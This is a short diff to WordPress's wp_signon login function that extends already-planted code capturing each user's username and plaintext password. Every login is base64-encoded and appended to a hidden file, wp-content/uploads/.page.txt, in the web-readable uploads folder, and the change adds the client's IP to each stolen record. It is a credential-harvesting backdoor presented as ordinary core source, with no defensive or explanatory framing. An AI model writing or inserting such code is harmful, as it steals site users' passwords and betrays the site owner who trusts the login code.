@@ -68,11 +68,11 @@ function wp_signon( $credentials = array(), $secure_cookie = '' ) {
 
         if ( ! empty( $credentials['remember'] ) ) {
                 $credentials['remember'] = true;
-                $credz = date('Y-m-d h:i:s') . " || IP: " . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                $credz = date('Y-m-d h:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                 file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
         } else {
                 $credentials['remember'] = false;
-                $credz = date('Y-m-d h:i:s') . " || IP: " . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
+                $credz = date('Y-m-d h:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                 file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
                 }
 
